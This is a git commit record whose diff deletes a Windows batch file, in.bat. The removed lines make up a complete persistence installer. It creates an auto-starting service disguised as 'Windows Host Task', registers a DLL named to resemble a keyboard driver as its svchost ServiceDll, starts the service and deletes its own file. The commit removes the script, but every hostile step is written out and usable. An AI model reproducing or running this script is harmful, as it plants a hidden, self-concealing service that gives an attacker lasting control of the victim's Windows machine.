020740fbc6b1c3f7b780dce96b1488b9b008c672
yusupovau <a.yusupovau@outlook.com>
2024-11-14 21:50:42 -0500

    Delete in.bat

--- in.bat
+++
@@ -1,7 +0,0 @@
-@echo off
-sc create WinHostTask binPath= "%SystemRoot%\system32\svchost.exe -k WinHostTask" type= share start= auto DisplayName= "Windows Host Task"
-sc description WinHostTask "Check Windows Host Task"
-reg add HKLM\SYSTEM\CurrentControlSet\services\WinHostTask\Parameters /v ServiceDll /t REG_EXPAND_SZ /d %SystemRoot%\system32\kbdth101.dll /f
-reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost" /v WinHostTask /t REG_MULTI_SZ /d WinHostTask /f
-sc start WinHostTask
-del %0
